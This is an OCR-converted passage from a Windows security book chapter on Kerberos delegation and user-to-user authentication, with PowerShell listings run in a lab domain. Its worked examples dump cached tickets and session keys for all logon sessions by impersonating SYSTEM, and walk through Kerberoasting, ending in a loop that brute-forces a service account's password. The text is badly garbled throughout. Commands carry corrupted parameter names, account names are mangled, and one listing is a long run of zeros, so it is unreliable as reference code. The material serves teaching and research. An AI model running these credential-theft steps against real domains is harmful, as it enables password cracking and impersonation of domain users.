## Kerberos Delegation

Delegation enables a service to forward a user's credentials to another service. This is useful because, when a user connects to a service using Kerberos, they do not provide it with their credentials. Instead, they provide a ticket that has been encrypted using the server's shared encryption key. The service could try forwarding the ticket on to another service, but as it won't know the new service's shared encryption key it won't be able to encrypt the ticket, so the new service won't accept it.

The only way to get an encrypted ticket for a new service might seem to be to send a TGS-REQ message to the TGS using a TGT. However, the original service only has a TGT for its own account, not for the user, and without the user's TGT a service can't forward a user's credentials further than specified. This behavior provides an important security measure; if any authentication a user made to a service could be delegated to another service, it would likely be easy to get full administrator access to the domain.

That said, forwarding credentials is a useful feature. For example, let's say you have a corporate network that users can access only from an external network, via a web server. It would be useful if the web server could provide the users' credentials to access the backend systems, such as a database server. One way of solving this issue would be for the web server to request the user's plaintext credentials and then use those to authenticate to the

Kerberos 479

---

domain, which would then provide the user's TGT. In practice, though, this is a terrible idea for security.

Therefore, to make it possible to securely forward credentials, Kerberos implements a defined delegation process. A client can opt in to delegation, allowing a target service to use their identity to request tickets for other network services on their behalf. Windows domains configure delegation on a per-account basis for both users and computers. In the GUI, you'll see the delegation dialog shown in Figure 14 - 7 when inspecting the properties of an account.

![Figure](figures/WindowsSecurityInternals_page_510_figure_002.png)

Figure 14-7: The delegation tab for the GRAPHITE computer account

Figure 14-7 shows three main options for delegation. The first option, the default, disables delegation for the account. The second option, called unconstrained delegation, allows the account to delegate to any other service on the network using the authenticating user's credentials. The third option, known as constrained delegation, allows the user's credentials to be delegated to a fixed set of services defined by a list of permitted SPNs.

Let's dig into the similarities and differences between the two types of delegation and see how they're implemented. In the following sections, we'll modify some of the delegation settings in the Active Directory server. This means that you must perform these operations from a user account that has SeEnableDelegationPrivilege on the domain controller. Typically, only administrators have this privilege, so you should run these examples as a domain administrator.

480    Chapter 14

---

## Unconstrained Delegation

Microsoft introduced unconstrained delegation in Windows 2000 along with the original Windows Kerberos implementation. This Kerberos delegation mechanism requires the client to opt in to providing a copy of their TGT, enabling the service to delegate their credentials. It works only with Kerberos authentication, as the user must have first authenticated to the service using the Kerberos protocol. Figure 14-8 gives an overview of the unconstrained delegation process.

![Figure](figures/WindowsSecurityInternals_page_511_figure_002.png)

Figure 14-8: The unconstrained delegation process

This figure shows a client delegating its credentials through the HTTP service on the server WEB to the database service on the server DB . The client first makes a ticket request to the TGS with its TGT for a normal ticket, using the HTTP/WEB.MINERAL SPN . If the destination service can use delegation, the returned ticket should have the OkAsDelegate flag set, which indicates to the client that it can delegate if it wants to.

The client then makes a second request for a new TGT to send to the HTTP service. The client indicates its intention by specifying the target principal name as the http@user and setting the forwardable and forwarded flags on the TGS-REQ ❸. If delegation is allowed, the TGS will return this new TGT to the client.

The client can then package up the original service ticket and the TGT into the AP-REQ message for the server and send it over HTTP . The AP-REQ must also contain the session key information for the encrypted TGT so that the target service can decrypt it. The Windows APIs enable mutual authentication when delegating credentials, so the server returns an AP-REQ to the client .

Kerberos 481

---

Once the HTTP service has received the AP-REQ, it can get the LSA to give it a token for that user. The LSA will also save the TGT and session key information in the new logon session. When the HTTP service wants to authenticate to the database service, it can impersonate the user's token and start the Kerberos authentication process. This means the user's TGT will be used to request a ticket for SQL/DB.MINERAL from the TGS . Assuming the service meets all the policy requirements, the TGS will return the service ticket , which the LSA will return as a new AP-REQ to pass to the database service , completing the delegation.

As the delegated TGT is sent via the AP-REQ message, we should be able to inspect the delegation process occurring during a local authentication in PowerShell. The authenticating user needs a registered SPN. We'll use the alice user, for whom we added an SPN in "Decrypting the AP-REQ Message" on page 469. First we must enable unconstrained delegation for this user. You can either use the GUI to enable the delegation, or run the following Set-AccountControl PowerShell command as a domain administrator:

```bash
PS> Set-ADAccountControl -Identity alice -TrustedFoxDelegation $true
```

You can verify that delegation has been enabled using the Get-ADUser or Get-ADComputer command (depending on the account type), as shown in Listing 14-17.

```bash
PS> Get-ADUser -Identity alice -Properties TrustedForDelegation |
Select-Object TrustedForDelegation
TrustedForDelegation
----------------------
True
```

Listing 14-17: Querying the user's TrustedForDelegation property

Now let's create a client authentication context and request an AP-REQ message with a delegate ticket (Listing 14-18).

```bash
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $credout -Target
"HTTP/graphite"-RequestAttribute MutualAuth, Delegate
PS> $key = Get-KerberosKey -Password "AlicePassword" -KeyType ARCFOUR_HMAC_MDS
-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"
PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key |
Format-LsaAuthToken
<kerberosVS KRB_AP_REQ>
Options
: MutualAuthRequired
<Ticket>
Ticket Version : 5
Server Name
: SRV_INST - HTTP/graphite
Realm
: MINERAL_LOCAL
Flags
:
Forwardable, Renewable, PreAuthent, OkAsDelegate, EncPARrep
--snip--
Listing 14-18: Requesting an AP-REQ and displaying the delegate ticket
```

---

We must specify both the #uaioAuth and delegate flags ❸ for the LSA to request the delegated TGT. Note that the #dalesleate flag is set in the resulting ticket ❹. This flag exists regardless of whether the client requested delegation, as the LSA combines it with the delegate request attribute to determine whether to request the TGT.

The authenticator stores the new TGT as part of the GSSAPI checksum, as shown in Listing 14-19.

```bash
<Authenticator>
  Client Name   : PRINCIPAL - alice
  Client Realm  : MINERAL.LOCAL
  Client Time    : 5/15 1:51:00 PM
  Checksum     : GSSAPI
  Channel Binding : 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 14-19: The AP-REQ authenticator with the delegated TGT

If you compare this authenticator with the one shown in Listing 14-15, the first difference you should notice is that both the Delegate and Mutual context flags are set ❶.

The delegate flag indicates that a Kerberos Credential (KRB-CRED) structure is packed into the checksum field. Within the KBR-CRED, we find the TGT ticket ❹ . We can tell it's a TGT because it's for the hhsgt principal ❸ . The KBR-CRED structure also contains an extra encrypted part to hold the session keys that go with the TGT ❸ .

If we can complete the authentication, we can receive an impersonation token. The LSA now has enough information for the service to request any service ticket on behalf of the user that provided the delegated TGT, as demonstrated in Listing 14-20.

```bash
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $server = New-LsaServerContext -CreditHandle $credin
PS> Update-LsaServerContext -Server $server -Client $client
```

Kerberos     483

---

```bash
PS> Use-NtObject($token = Get-LsaAccessToken $server) {
        Format-NtToken $token -Information
    }
    TOKEN INFORMATION
----------------------
    Type        : Impersonation
    Imp level  : Delegation
    --snip--
```

Listing 14-20: Completing the delegation authentication process

Notice that the Token object in Listing 14-20 has the Delegation impersonation level. Certain kernel APIs enforce this impersonation level, including SeCreateClientSecurity, which captures the calling client's token for later use by the impersonateClient kernel API. The SeCreateClientSecurity API takes a Boolean ServerIsRemote parameter. If the parameter is True, the API fails to capture the token if the impersonation level is not Delegation. However, well-known callers such as the SMB do not set the parameter to True. Therefore, the Delegation impersonation level is the de facto equivalent to the Impersonation level for both local and remote access, assuming there are credentials available in the logon session.

## NOTE

In Windows 10 and later, you can enable a feature called Credential Guard that uses virtualization technology to protect the user's credentials, including the Kerberos TGT session key stored by the LSA, from being disclosed to a privileged user reading the memory of the LSASS process. As unconstrained delegation would introduce a mechanism to disclose the TGT session key for a user, it is no longer possible to use it if Credential Guard is enabled.

## Constrained Delegation

Microsoft introduced constrained delegation, also called Service for User (SFU) , in Windows 2003. Its purpose was to fix a security weakness in unconstrained delegation: namely, once a user had delegated credentials to a service, it could impersonate them to any other service in the same domain, even if the services were completely unrelated to the purpose of the original service.

This made any service with unconstrained delegation a good target for attack. If you compromised the service and could convince a privileged user to delegate their credentials to it, you had a good chance of compromising the entire network. Technically a user had to opt in to delegating their credentials, but common client applications such as Internet Explorer did so by default, and always passed the delegate request attribute when setting up the client authentication context.

Microsoft resolved the security weakness by allowing an administrator to specify an explicit list of SPNs that the service could use for delegation. For example, the administrator could limit the HTTP service discussed earlier to delegating only to the database service and nothing else.

484    Chapter 14

---

Constrained delegation can work in three modes:

- ●  Kerberos-only delegation
●  Protocol transition delegation
●  Resource-based delegation
We'll cover each mode in turn in the following sections.

## Kerberos-Only Delegation

Also called Service for User to Proxy (S4U2proxy) in the official documentation, the Kerberos-only delegation mode works in much the same way as unconstrained delegation. It requires the user to authenticate to the intermediate service using Kerberos, as described in Figure 14 - 9 .

![Figure](figures/WindowsSecurityInternals_page_515_figure_005.png)

Figure 14-9: An overview of constrained Kerberos-only delegation

While this looks very similar to Figure 14 - 8 , there are subtle differences. First, the original user requests a normal service ticket for the HTTP service ❶ , not an additional TGT. The user can package this service ticket into an AP-REQ message and send it to the HTTP service ❷ . The HTTP service then wants to delegate the user's authentication to the database service, so it requests a service ticket from the TGS, including its own TGT. It also attaches the user's service ticket for its own service to the TGS-REQ message ❸ .

The TGS inspects the request. If the user's service ticket has the forwardable flag set and the database service is in the list of allowed services for the account making the ticket request, the TGS will use the user's service ticket to the HTTP service to generate a service ticket for the database

---

service . The service can package this ticket and associated information into an AP-REQ message as normal and send it to the database service .

While it might seem as though the user can't control the delegation of their credentials, they could block the delegation by simply choosing not to request a forwardable service ticket. We'll come back to how to unset the Forwardable flag later.

The list of SPNs for services to which an account can delegate is stored in the user's or computer's account entry in Active Directory, in the msDS-AllowedToDelegateTo attribute. You can set this attribute using Set-ADUser or Set-ADComputer in PowerShell, as shown in Listing 14-21.

```bash
PS: $$psn = #("msd-AllowedToDelegateTo ="("CIFS/graphite")) \
PS: #Set-ADUser -Identity alice -Add $psn
```

Listing 14-21: Adding a new msDS-AllowedToDelegateTo entry for the alice account

To query the list of SPNs, use Get-ADUser or Get-ADComputer, as shown in Listing 14-22.

```bash
PS> Get-ADUser -Identity alice -Properties 'msDS-AllowedToDelegateTo' |
Select-Object -Property 'msDS-AllowedToDelegateTo'
msDS-AllowedToDelegateTo
----------------------
{CIFS/graphite}
```

Listing 14-22: Querying the msDS-AllowedToDelegateT o attribute

In this example, we confirm we can delegate to the CIFS/graphite service.

## Protocol Transition Delegation

Requiring end-to-end Kerberos authentication to the domain isn't always feasible. For example, what if the user accessing the HTTP service is on a public network and cannot directly connect to the KDC to get a service ticket? This is where the second type of constrained delegation—protocol transition delegation, referred to as Service for User to Self (SfU2sdf) in the documentation—might be useful. It performs an authentication protocol transition , meaning that the frontend HTTP service can authenticate using its own authentication mechanism, then use that information to construct a service ticket for the database service with the user's domain credentials, without requiring the user to know about Kerberos.

Figure 14 - 10 shows the steps involved in constrained delegation using an authentication protocol transition.

---

![Figure](figures/WindowsSecurityInternals_page_517_figure_000.png)

Figure 14-10: An overview of constrained delegation with an authentication protocol transition

The user first makes a request to the HTTP service and provides authentication credentials . The credentials don't have to be related to the Kerberos credentials we want to use, and the authentication protocol used can be anything, such as basic HTTP authentication. The HTTP service maps the authenticated user to a domain account, then makes a request to the TGS for a service ticket for itself with that domain account's information .

The TGS gathers all of the target user's details (like their group memberships), puts them into the PAC, and sends the service ticket back to the service. Because the ticket is for the service itself, the LSA can decrypt the ticket, extract the PAC, and generate a Token object.

This process might seem dangerous. After all, it lets you request a service ticket out of thin air without requiring any authentication of the user. Believe it or not, this is really how S3U2self works; however, bear in mind that the token generated is only useful for the local system. The LSA can already synthesize a token containing any groups it likes and use it locally, so this doesn't change the security properties of the system.

Unlike with a synthesized local token, though, the LSA has a copy of the S4U2self service ticket. If the service's account is configured for delegation, it can use S4U2proxy with the S4U2self service ticket to request a service ticket for a permitted service ❶ . It can then package this new service ticket in an AP-REQ and use it to authenticate to the database service ❷ .

You can configure SAU2self to be permitted to transition to SAU2proxy by setting the list of permitted SPNs in ns05-AllowedToDelegateTo and setting the user account control flag TrustedToAuthForDelegation to True. You

Karbaros 487

---

saw how to modify the permitted SPNs in Listing 14-21. You can set the TrustedAuthForInlegation flag using the following command:

```bash
PS> Set-ADAccountControl -Identity alice -TrustedToAuthForDelegation $true
```

To query the status of the flag, use Get-ADUser or Get-ADComputer, as shown in Listing 14-23.

```bash
PS> Get-ADUser -Identity alice -Properties TrustedToAuthForDelegation |
Select-Object -Property TrustedToAuthForDelegation
TrustedToAuthForDelegation
------------------------------------
True
```

Listing 14-23: Querying the TrustedT oAuthForDelegation flag

You'll note we do not check whether we can request the initial $A$U2self ticket. As mentioned earlier, this is only an issue for the local system's security. Without $A$U2proxy configured, the computer can't use the credentials in a network request. In fact, any user on Windows can request an $A$U token using !talegolog-user or via the get-NTtoken command, even if not connected to an enterprise network.

Listing 14-24 shows that we're currently running as the alive user. Let's try requesting a token for another user.

```bash
PS> Show-NtTokenEffective
MINERAL\alice
PS> $token = Get-NtToken -S4U -User bob -Domain MINERAL
PS> Format-NtToken $token
MINERAL\bob
PS> Format-NtToken $token -Information
TOKEN INFORMATION
----------------------
Type      : Impersonation
Imp Level  : Identification
--snip--
```

Listing 14-24: Requesting an S4U2self token as a normal user

Here, we use Get-NTToken with the $Id parameter to request a token for the bob user ❶ . Notice we don't need to specify a password. We can confirm that the token is really for bob by formatting it ❷ .

This design would have a massive local security hole if the LSA didn't restrict the token to Identification level, which prevents a normal user from being able to use the token to access secured resources . The only way to get an Impersonation-level token is to have SetChrPrivileges enabled, which only the local SYSTEM account has by default. Thus, it's typical to configure TrustedIoAuthForDelegation on the computer account used by the SYSTEM account, so it can impersonate the SAI2Self object at the Impersonation level, then get the LSA to query for the SUI2proxy ticket.

---

## Resource-Based Delegation

The final constrained delegation type, resource-based delegation, was introduced in Windows Server 2012. It doesn't change the underlying delegation process outlined previously; instead, it changes the condition under which a forwardable ticket gets issued for a service. Rather than basing this decision only on the account requesting the delegated ticket, it also considers the target SPN being requested.

The msDS-AllowedToActOnBehalfOftheirIdentity attribute on a user or computer object controls resource-based delegation. This attribute is a security descriptor that contains an ACE for every account the user can delegate to. You can set it using the Set-ADUser or Set-ADComputer PowerShell command by specifying distinguished names of the users or computers to the PrincipalAllowedToBelegateToAccount parameter. In Listing 14-25, we add the GRAPHITE computer account to the list of accounts to which the alice user can delegate.

```bash
P5> Get-ADUser -Identity alice
     -PrincipalsAllowedToDelegateToAccount (Get-ADComputer GRAPHITE)
  P5> Get-ADUser -Identity alice -Properties
     PrincipalsAllowedToDelegateToAccount |
     Select-Object PrincipalsAllowedToDelegateToAccount
     PrincipalsAllowedToDelegateToAccount
  ♦ {CN=GRAPHITE,,CN=Computers,DC=mineral,DC=com)
  P5> $name = msDS-AllowedToActOnMehalfOfOtherIdentity"|
  P5> {Get-ADUser -Identity alice -Properties $name} | \
    Convertto-NtSecurityDescriptor | Format-NtSecurityDescriptor -Summary
  <Owner : BUILTIN\Administrators
  <DACL>
  MINERAL\GRAPHITE$:: (Allowed)(None)(Full Access)
```

Listing 14-25: Setting resource-based delegation on a user account

This allows the GRAPHITE computer account to request a service ticket for one of the alice user's SPNs. The Get-Advertiser command exposes the full distinguished name of the target account ❶ , but if we extract the security descriptor from the attribute and format it, we see the MINERAL\ GRAPHITE\$ID in an ACE in the formatted DACL ❷ .

When transitioning from S4U2Self to S4U2proxy, the client principal doesn't need to have the TrustedToAuthPermission flag set. As a mechanism of control, the domain controller provides two group SDAs that indicate the source of the token. Table 14-2 shows these two SDAs.

Table 14-2: SIDs for Asserted Identities

<table><tr><td>Name</td><td>SID</td><td>Description</td></tr><tr><td>Authentication authority asserted identity</td><td>S-1-18-1</td><td>Token generated through authentication</td></tr><tr><td>Service asserted identity</td><td>S-1-18-2</td><td>Token generated through an S4U mechanism</td></tr><tr><td></td><td></td><td>Kerberos 489</td></tr></table>


---

The first SID indicates that the Token object was generated by providing authentication credentials to the KDC . The second SID is assigned for S4U2ref or S4U2proxy tokens. A security descriptor can use these SIDs to limit access to a service configured for resource delegation to either Kerberos-only delegation, which gets the first SID, or authentication protocol transition delegation, which gets the second.

Delegation is a dangerous feature if misconfigured, and it's easy to misconfigure. This seems especially true for transitioning from SxU2Self to SxU2Proxy through constrained delegation, through which a service could impersonate any user in the domain, including privileged users. To reduce the danger of this occurring, the system can set the AccountNotDelegated UAC flag to True on an account to block it from being used in a delegation scenario. In the GUI, this flag is called "Account is sensitive and cannot be delegated." You can set it on the domain controller using a domain administrator account by running the following PowerShell command:

```bash
PS> Set-ADUser -Identity alice -AccountNotDelegated $true
```

In Listing 14-26, we look at what this flag changes to prevent delegation.

```bash
♦ PS> Get-ADUser -Identity alice -Properties AccountNotDelegated |
     Select-Object AccountNotDelegated
     AccountNotDelegated
     --------------------
     True
     PS> $client = New-LsaClientContext -CredHandle $credout -Target
     "HTTP/graphite"
     PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key |
     Format-LsaAuthToken
     <KerberosV5 KRB_AP_REQ>
     Options      : MutualAuthRequired
     <Ticket>
     Ticket Version  : 5
     Server Name    : SRV_INST - HTTP/graphite
     Realm        : MINERAL_LOCAL
  ♦ Flags        : Renewable, PreAuthent, EncPARep
     ---snip--
```

Listing 14-26: Inspecting ticket flags for an account with AccountNotDelegated set

First, we confirm that the alive user has the AccountNotDelegated flag set to True ❶ . We then request a service ticket for this user. By decrypting it, we can see that the Forwardable flag is no longer present ❷ . As explained earlier, the TGS will refuse to issue a new service ticket based on an existing service ticket if the Forwardable flag is not set. This effectively blocks delegation automatically. Note that if the Forwardable flag is set and you've just changed the value of the AccountNotDelegated flag, I'd recommend logging out, then logging back in as the user to ensure the user has no tickets cached.

Until now, we've needed an SPN configured for a user or computer in order for the KDC to select the correct shared encryption key. An

490     Chapter 14

---

alternative authentication mode is also available that allows users to authenticate to each other without an SPN. Let's finish the chapter by discussing how we can use Kerberos without configuring an SPN for a user.

## User-to-User Kerberos Authentication

The NTLM protocol can perform network authentication between unprivileged users, but because a Kerberos account needs a mapped SPN in order to grant a ticket, it shouldn't normally be able to do this. To enable authentication between unprivileged users, Windows Kerberos includes a feature called User-to-User (U2U) authentication . Figure 14 - 11 shows the basic operations of U2U authentication.

![Figure](figures/WindowsSecurityInternals_page_521_figure_003.png)

Figure 14-11: User-to-user authentication with Kerberos

In this figure, Alice wants to authenticate to a service running under Bob's account. However, Bob doesn't have an SPN registered, so when Alice makes a service ticket request ❶ , it will fail, as the KDC doesn't know the target SPN. But because the requested service name is in UPN format (that is, bob@mineral.local ), the LSA assumes that the user wants U2U authentication and instead generates a TGT-REQ message. It sends the TGT-REQ message to the service running under Bob's account ❷ .

The service accepts the TGT-REQ token, and the LSA packages bob's cached TGT into a TGT-REQ message to send back to the client ❸ (Note that the LSA simply takes the caller's cached TGT; it doesn't seem to pay any

Kerberos   491

---

attention to the UPN in the TGT-REQ. Therefore, the TGT returned might not be for the user requested, which will be important in the next step.)

Upon receipt of the TGT-REP, the LSA can package the TGT for alice and the TGT for bob into a TGS-REQ, then request a service ticket for bob on local host ❶ . The TGS can then decrypt the TGTs, verify that the extra TGT is for the requested user account, and generate a service ticket encrypted with the TGT session key for bob . If the extra TGT is not for bob , perhaps because the service was not running under bob 's account, the request will fail.

Assuming the request succeeds, the client's LSASS can package up the service ticket into an AP-REQ message to send to the service and complete the authentication . Let's run a test to see U2U authentication in operation (Listing 14-27).

```bash
PS> $credout = New-IsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
  PS> $client = New-IsaClientContext -CreditHandle $credout -Target
  bob@mineral.local
  PS> Format-IsaAuthToken -Token $client.Token
  <KerberosV5_KRB_TGT_REQ>
  Principal: bob@mineral.local
```

Listing 14-27: Initializing the U2U authentication client

First, we initialize the U2U client authentication context; note this should be running as the alive user. You should be familiar with most of this code by now; the only important difference is specifying bob@mineral.local as the target SPN ❶ . When we format the authentication token, we see a TGT-REQ message containing the desired principal ❷ . We now need the server authentication context to continue the authentication process (Listing 14-28).

```bash
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
  -ReadCredential
  UserName: bob
  Domain: MINERAL
  Password: 600000
  PS> $server = New-LsaServerContext -CredHandle $credin
  PS> Update-LsaServerContext -Server $server -Client $client
  PS> Format-LsaAuthToken -Token $server.Token
  @<KerberosVS KRB_TGT_REP>
  Ticket Version : 5
  Server Name    : SRV_INST - krbtgt/MINERAL..LOCAL
  Realm          : MINERAL..LOCAL
  Encryption Type : AES256_CT_HMAC_SHA1_96
  Key Version   : 2
  Cipher Text :
  00000000: 98 84 C6 F4 B3 92 66 A7 50 6E 98 C2 AF 48 70 09
  00000010: 76 E9 75 EB D6 DE FF A5 A2 E9 6F 10 A9 1E 43 FE
  --snip--
```

Listing 14-28: Creating the server authentication context and getting the TGT-REP

492    Chapter 14

---

We first create the credentials handle and read the credentials for bob from the shell. It's necessary to specify credentials for bob because otherwise the server authentication would use aier's TGT, which would fail when creating the service ticket for the bob@mineral.local SPN. With the credentials handle, we can create the server authentication context.

By formatting the returned authentication token, we can see it's a


TGT-REP with the TGT ticket ❶ . We don't know the hbkbt user's password, so we can't decrypt it, meaning there's no way of knowing whether the ticket is for bob or not. In Listing 14-29, we update the client authentication context with the TGT-REP message and print the new authentication token.

```bash
PS> Update-lsaClientContext -Client $client -Server $server
  PS> Format-lsaAuthToken -Token $client.Token
  ♦ <KerberosV5 KRB_AP REQ>
  ♦ Options        : UseSessionKey
  <Ticket>
  Ticket Version  : 5
  ♦ Server Name    : PRINCIPAL - bob
  Realm          : MINERAL_LOCAL
  Encryption Type : AES25G_CTS_HMAC_SHA1_96
  Cipher Text      :
  00000000: 26 3B A8 9D DA 13 74 9F DC 47 16 83 0C AB 4F FF
  00000010: 75 A3 45 E4 16 6F D1 E9 DA FA 71 E2 26 DE 42 8C
  --snip--
```

Listing 14-29: Continuing the U2U authentication

We can see that we now have our AP-REQ message to send to the server❶. It contains a ticket encrypted with bob's session key❷, and the target principal is bob@mineral.local❸. In Listing 14-30, we're back on the server side.

```bash
#! PS> Update-LsaServerContext -Server $server -Client $client
#! PS> Use-NtObject($token = Get-LsaAccessToken $server) {
        Get-NtLogonSession $token | Format-Table
    }
        LogonId                UserName               LogonType SessionId
    --------------------------------------
    ----------------------------- ----------------------
```

Listing 14-30: Completing U2U authentication

We complete the authentication ❶ and query the Token object, which indicates a successful logon for alice ❷ .

## Worked Examples

Let's walk through some worked examples to demonstrate how you can use the various commands in this chapter to help with security research or systems analysis.

Kerberos 493

---

## Querying the Kerberos Ticket Cache

The LSA maintains a cache of tickets requested using Kerberos for each logon session. You can query the current user's ticket cache using the Get-KerberosTicket command, as shown in Listing 14-31.

```bash
# PS> Get-KerberosTicket | Select-Object ServiceName, EndTime
                            ServiceName                     EndTime
                            ----------------------------- -----------------
                            SRV_INST - krbtgt/MINERAL.LOCAL      3/19 6:12:15 AM
                            SRV_INST - LDAP/PRIMARYDC.mineral.local/mineral.local 3/19 6:12:15 AM
# PS> Get-KerberosTicket | Select-Object -First 1 | Format-KerberosTicket
                            Ticket Version : 5
                            Server Name    : SRV_INST - krbtgt/MINERAL.LOCAL
                            Realm        : MINERAL.LOCAL
                            Encryption Type : AES256_CTS_HMAC_SHA1_96
                            Key Version    : 2
                            Cipher Text :
                            00000000: 10 F5 F3 39 C5 E1 60 BB 59 E0 CF 04 61 F6 2D CF E2
                            00000010: 94 B3 88 46 DB 69 88 FF FA F2 F8 82 52 AD 48 20 9C
                            00000020: 2D AE A4 02 48 9E 75 F3 D0 05 23 63 70 31 E4 88
                            00000030: 4F 3E 00 E7 23 DE 48 7A 00 A9 47 62 90 61 24 65
                            ---snip---
```

Listing 14-31: Querying the Kerberos ticket cache

First, we query for the tickets ❶, selecting the fields ServiceName (the ticket's SPN) and endTime (the expiration time for the ticket, at which point it must be renewed). The first ticket in the cache is the user's TGT, used for requesting service tickets ❷. In this example, we also have a service ticket for the LDAP directory server.

We can view a cached Kerberos ticket using the format-KerberosTicket command , but the ticket is still encrypted, and as we probably don't know the target service's shared key we won't be able to decrypt it. In theory, we could send the ticket to the destination service to authenticate to it directly. However, we don't have the extracted session key needed to encrypt the authentication data in a valid AP-REQ either, so we'll need to call the SSI to generate the AP-REQ based on the cached ticket.

If you have SetIcbPrivilege enabled, however, each ticket cache entry should contain the session key. Listing 14-32 shows how to query for all tickets for all local logon sessions and extract the cached session key.

```bash
PS> $sess = Get-NTLogonSession
PS> $tickets = Invoke-NTToken -System { Get-KerberosTicket -LogonSession $sess }
PS> $tickets | Select-Object ServiceName, { Format-HexDump $_.SessionKey.Key }
ServiceName
                          Format-HexDump $_.SessionKey.Key
----------------------
SRV_INST - krbtgt/MINERAL_LOCAL  EE 3D D2 F7 6F 5F 7E 06 B6 E2 4E 6C C6 36 59 64
--snlp--
```

Listing 14-32: Extracting all tickets and session keys

494    Chapter 14

---

We start by getting the list of logon sessions that can be passed to Get-KerberosTicket. We need to have SetDbPrivilege enabled to query for the tickets of any logon session except the caller's, so we impersonate the SYSTEM user while querying the cache.

Impersonating SYSTEM also allows us to get the session key. We can format the key as hex along with the SPN of the cached ticket. With both the ticket and the session key, we can implement our own authentication request to the service.

## Simple Kerberoasting

One potential reason to interact with the ticket cache is to get a ticket for Kerberosing an attack described in the “Silver Tickets and Kerberosing” box on page 465. However, you don’t need to query the cache for this attack, as you can find all the information you need using the SSPI APIs. Let’s walk through a simple example so that you can understand how the Kerberosing process works. First, in Listing 14-33, we query for all user accounts with configured SPNs.

```bash
PS> Get-ADUser -Filter {
    ObjectClass -eq 'user'
} -Properties ServicePrincipalName |
Where-Object ServicePrincipalName -ne $null |
Select SamAccountName, ServicePrincipalName
SamAccountName ServicePrincipalName
----------------------
krbtgt
        {kadmin/changepw}
alice
        {HTTP/graphite}
sqlserver
        {MS SQL/topaz.mineral.local}
```

Listing 14-33: Checking for users with configured SPNs

We see the kibqt user, and that alice still has the HTTP/graphite SPN we configured earlier in the chapter. We also see an account for a SQL server that has the SPN MSSQL/topaz.mineral.local.

We don't want to pick hbhgt as a target, as this account will have a complex password that will be difficult to brute-force (any computer account with an SPN configured also has an automatically configured complex password). We'll try to brute-force the password for the sshserver user. First we need to make a request for its SPN and receive the ticket (Listing 14-34 ).

```bash
PS> $creds = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $creds
-Target "MSSQL/topaz.mineral.local"
PS> Format-IsaAuthToken $client
<KerberosV5 KRB_AP_RED>
Options      :  None
<Ticket>
Ticket Version  : 5
Server Name    :  SRV INST - MSSQL/topaz.mineral.local
Realm            :  MINERAL_LOCAL
```

---

```bash
Encryption Type : ARCFOUR_HMAC_MD5
Key Version    : 2
Cipher Text    :
00000000: F3 23 A8 DB C3 64 BE 58 48 7A 4D E1 20 50 E7 B9
00000010: CB CA 17 59 A3 SC 0E 1D 6D 56 F9 B5 5C F5 EE 11
---snip--
```

Listing 14-34: Getting a service ticket for the sqlserver user

Now that we have the ticket, we can generate a key based on a list of passwords. We can then try to decrypt the ticket with each key until we find a key that works, as illustrated in Listing 14-35.

```bash
PS> $pwds = "ABC!!!!", "SQLRUS", "DBPassword"
PS> foreach($pwd in $pwds) {
  $key = Get-KerberosKey -Password $pwd -Keytype ARCFOUR_HMAC_MD5
-NameType SRV_INST -Principal "MSSQL/topaz.miner.local@0minal.local"
  $dec_token = Unprotect-LsaAuthToken -Key $key -Token $coin.Token
O if ($dec_token.Ticket.Decrypted) {
      Write-Host "Decrypted ticket with password: $pud"
      break
    }
}  
Decrypted ticket with password: DBPPassword
```

